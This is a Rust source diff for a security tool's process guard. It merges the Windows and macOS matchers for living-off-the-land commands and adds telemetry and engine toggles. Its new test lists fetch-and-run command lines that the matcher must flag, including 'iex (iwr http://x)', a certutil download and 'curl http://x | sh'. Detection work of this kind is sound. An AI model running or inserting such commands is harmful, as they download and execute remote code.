@@ -1,8 +1,9 @@
 use crate::bin_ai::{self, BinaryAiScanner};
-use crate::config::AppConfig;
+use crate::config::{AppConfig, Engine};
 use crate::logger;
 use crate::platform;
 use crate::quarantine::{self, Severity, ThreatEvent};
+use crate::status::Telemetry;
 use std::collections::HashMap;
 use std::ffi::OsStr;
 use std::fs;
@@ -131,14 +132,9 @@ pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static st
         .find(|pattern| normalized.contains(pattern))
 }
 
-#[cfg(windows)]
-fn platform_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
-    match_lotl(process_name, cmdline)
-}
-
-#[cfg(target_os = "macos")]
-fn platform_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
-    match_lotl_macos(process_name, cmdline)
+/// Both rule sets: Windows script hosts and macOS shells/interpreters have disjoint names.
+pub fn check_lotl_command(proc_name: &str, cmdline: &str) -> Option<&'static str> {
+    match_lotl(proc_name, cmdline).or_else(|| match_lotl_macos(proc_name, cmdline))
 }
 
 fn refresh_kind() -> ProcessRefreshKind {
@@ -164,6 +160,7 @@ fn command_line(process: &Process) -> String {
 pub struct ProcessGuard {
     cfg: Arc<AppConfig>,
     scanner: Arc<BinaryAiScanner>,
+    telemetry: Arc<Telemetry>,
     sys: System,
     /// pid -> start time, so a recycled PID is treated as a new process.
     seen: HashMap<Pid, u64>,
@@ -171,10 +168,15 @@ pub struct ProcessGuard {
 }
 
 impl ProcessGuard {
-    pub fn new(cfg: Arc<AppConfig>, scanner: Arc<BinaryAiScanner>) -> Self {
+    pub fn new(
+        cfg: Arc<AppConfig>,
+        scanner: Arc<BinaryAiScanner>,
+        telemetry: Arc<Telemetry>,
+    ) -> Self {
         Self {
             cfg,
             scanner,
+            telemetry,
             sys: System::new(),
             seen: HashMap::new(),
             trust_cache: HashMap::new(),
@@ -182,6 +184,12 @@ impl ProcessGuard {
     }
 
     pub fn poll(&mut self) {
+        if !self.cfg.engine_enabled(Engine::ProcessGuard) {
+            // Forget everything so re-enabling inspects what is running at that moment.
+            self.seen.clear();
+            self.telemetry.processes_watched.store(0, Ordering::Relaxed);
+            return;
+        }
         self.sys
             .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
         let mut fresh = Vec::new();
@@ -194,6 +202,12 @@ impl ProcessGuard {
         }
         let live = self.sys.processes();
         self.seen.retain(|pid, _| live.contains_key(pid));
+        self.telemetry
+            .processes_watched
+            .store(live.len() as u64, Ordering::Relaxed);
+        self.telemetry
+            .processes_inspected
+            .fetch_add(fresh.len() as u64, Ordering::Relaxed);
         for pid in fresh {
             self.inspect(pid);
         }
@@ -209,17 +223,19 @@ impl ProcessGuard {
         }
         let cmdline = command_line(process);
         let exe = process.exe().map(Path::to_path_buf);
-        if let Some(pattern) = platform_lotl(&name, &cmdline) {
+        if let Some(pattern) = check_lotl_command(&name, &cmdline) {
             self.respond_lotl(pid, &name, &cmdline, pattern);
             return;
         }
         if let Some(exe) = exe {
-            self.scan_executable(pid, &name, &exe);
+            if self.cfg.engine_enabled(Engine::BinAi) {
+                self.scan_executable(pid, &name, &exe);
+            }
         }
     }
 
     fn respond_lotl(&mut self, pid: Pid, name: &str, cmdline: &str, pattern: &str) {
-        let action = if self.cfg.dry_run {
+        let action = if self.cfg.is_dry_run() {
             "DRY_RUN: would terminate process".to_string()
         } else if self.sys.process(pid).is_some_and(|p| p.kill()) {
             "TERMINATED".to_string()
@@ -275,7 +291,7 @@ impl ProcessGuard {
             self.cfg.ai_threshold,
             self.scanner.engine_name()
         );
-        let action = if self.cfg.dry_run {
+        let action = if self.cfg.is_dry_run() {
             "DRY_RUN: would terminate process and quarantine executable".to_string()
         } else {
             let killed = self.kill_all_with_exe(exe);
@@ -331,8 +347,13 @@ impl ProcessGuard {
     }
 }
 
-pub fn run(cfg: Arc<AppConfig>, scanner: Arc<BinaryAiScanner>, shutdown: Arc<AtomicBool>) {
-    let mut guard = ProcessGuard::new(cfg, scanner);
+pub fn run(
+    cfg: Arc<AppConfig>,
+    scanner: Arc<BinaryAiScanner>,
+    telemetry: Arc<Telemetry>,
+    shutdown: Arc<AtomicBool>,
+) {
+    let mut guard = ProcessGuard::new(cfg, scanner, telemetry);
     logger::info("process guard active");
     while !shutdown.load(Ordering::SeqCst) {
         if panic::catch_unwind(AssertUnwindSafe(|| guard.poll())).is_err() {
@@ -473,5 +494,34 @@ mod tests {
             None
         );
         assert_eq!(match_lotl("zsh", "zsh -c curl x | sh"), None);
+    }
+
+    #[test]
+    fn unified_matcher_covers_both_platforms() {
+        for (name, cmdline) in [
+            ("powershell.exe", "powershell.exe -w hidden -enc SQBFAFgA"),
+            ("powershell.exe", "powershell -ep bypass iex (iwr http://x)"),
+            (
+                "certutil.exe",
+                "certutil -urlcache -split -f http://x/a.exe",
+            ),
+            ("sh", "sh -c \"curl http://x | sh\""),
+            ("osascript", "osascript -e 'do shell script \"id\"'"),
+            ("bash", "bash -c echo aWQ= | base64 -D"),
+        ] {
+            assert!(
+                check_lotl_command(name, cmdline).is_some(),
+                "{name}: {cmdline}"
+            );
+        }
+        for (name, cmdline) in [
+            ("powershell.exe", "powershell.exe -Command Get-Date"),
+            ("git.exe", "git status"),
+            ("git", "git status"),
+            ("cargo.exe", "cargo build"),
+            ("zsh", "zsh -c cargo build"),
+        ] {
+            assert_eq!(check_lotl_command(name, cmdline), None, "{name}: {cmdline}");
+        }
     }
 }
